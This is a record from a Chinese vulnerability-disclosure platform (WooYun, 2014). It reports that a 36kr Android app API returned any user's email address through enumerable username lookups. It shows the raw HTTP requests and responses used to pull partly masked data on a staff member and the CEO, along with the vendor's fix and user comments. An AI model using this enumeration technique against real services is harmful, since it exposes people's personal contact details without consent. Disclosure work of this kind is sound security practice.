{"id": 2127, "wybug_id": "wooyun-2014-072442", "wybug_title": "36kr某功能设计不当导致可获取所有用户联系信息", "wybug_corp": "36氪科技博客", "wybug_author": "loli", "wybug_date": "2014-08-15 08:50", "wybug_open_date": "2014-08-15 09:03", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-15：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 36kr某功能设计不当导致可获取所有用户联系信息. 详细说明：  1.今天装了个36kr的android app,在app里访问自己主页时抓包看了下。\nGET /api/v1/users/我的用户名.json HTTP/1.1Host: apis.36kr.comConnection: Keep-AliveUser-Agent: android-async-http/1.4.1 (http://loopj.com/android-async-http)Accept-Encoding: gzip\nResponse包如下：\nHTTP/1.1 200 OKServer: TengineDate: Thu, 14 Aug 2014 15:39:55 GMTContent-Type: application/jsonContent-Length: 267Connection: keep-aliveKeep-Alive: timeout=20Status: 200 OKX-UA-Compatible: IE=Edge,chrome=1Cache-Control: max-age=0, private, must-revalidateX-Runtime: 0.006030X-Rack-Cache: missweibo: at_xinzhixiangX-UA-Compatible: IE=Edge,chrome=1{\"id\":108xx,\"name\":\"445xxx\",\"login\":\"a445xxx\",\"email\":\"445xxx@qq.com\",\"location\":\"\",\"company\":\"\",\"weibo\":\"\",\"website\":\"\",\"bio\":\"\",\"tagline\":\"\",\"gravatar_hash\":\"b3304f1ff2a6950e8893exxx\",\"avatar_url\":\"http://a.36krcnd.com/user/normal_avatar/108xx.jpg\"}\n2.通过测试，GET /api/v1/users/我的用户名.json 用户名是可以进行遍历的,gravatar_hash md5值是邮箱的md5；比如获取这位运营mm童鞋的信息：GET /api/v1/users/Jivin.json HTTP/1.1Host: apis.36kr.comConnection: Keep-AliveUser-Agent: android-async-http/1.4.1 (http://loopj.com/android-async-http)Accept-Encoding: gzipHTTP/1.1 200 OKServer: TengineDate: Thu, 14 Aug 2014 15:53:54 GMTContent-Type: application/jsonContent-Length: 360Connection: keep-aliveKeep-Alive: timeout=20Status: 200 OKweibo: at_xinzhixiang{\"id\":53904,\"name\":\"Jivin\",\"login\":\"Jivin\",\"email\":\"lijinwen333+krl马赛克\",\"location\":\"\",\"company\":\"36Kr\",\"weibo\":\"李锦雯_Jivin\",\"website\":\"\",\"bio\":\"\",\"tagline\":\"痘痘姐，求祛痘良方。\",\"gravatar_hash\":\"7d371541a03a42853c35454a42f9318b\",\"avatar_url\":\"http://a.36krcnd.com/user/normal_avatar/53904.jpg\"}   漏洞证明：  来个CEO滴:GET /api/v1/users/techfans.json HTTP/1.1Host: apis.36kr.comConnection: Keep-AliveUser-Agent: android-async-http/1.4.1 (http://loopj.com/android-async-http)Accept-Encoding: gzip{\"id\":15,\"name\":\"techfans\",\"login\":\"techfans\",\"email\":\"techfans@t马赛克\",\"location\":null,\"company\":null,\"weibo\":null,\"website\":\"http://www.techfans.net\",\"bio\":null,\"tagline\":null,\"gravatar_hash\":\"18e9bafa8f18c163f53ed47f4117821f\",\"avatar_url\":\"http://9429127371.a.uxengine.net/avatar/18e9bafa8f18c163f53ed47f4117821f.png?s=48\"}可批量：这里随便测试了些用户名：\n\n   修复方案：  验证接口权限。   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-08-15 09:00 厂商回复： 谢谢反馈，我们已经更新修复这个问题～ 最新状态： 2014-08-15：谢谢反馈，我们已经更新修复这个问题～  ", "replys": "漏洞评价：\n评论\n     2014-08-15 09:16 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  速度够快的。。    \n     2014-08-18 21:00 |    \t\tHHHO \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | wohoooo)\t\t \n  只有5个rank，洞主您手疼心也疼吧    \n     2014-08-20 17:22 |    \t\tcharles_zhang \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 做一个爱学习的小白帽。)\t\t \n  反馈这么快啊    \n     2014-08-22 18:05 |    \t\tIT偏执狂 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 禁锢我们的究竟是什么？)\t\t \n  提交时间：\t 2014-08-15 08:50修复时间：\t 2014-08-15 09:03    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}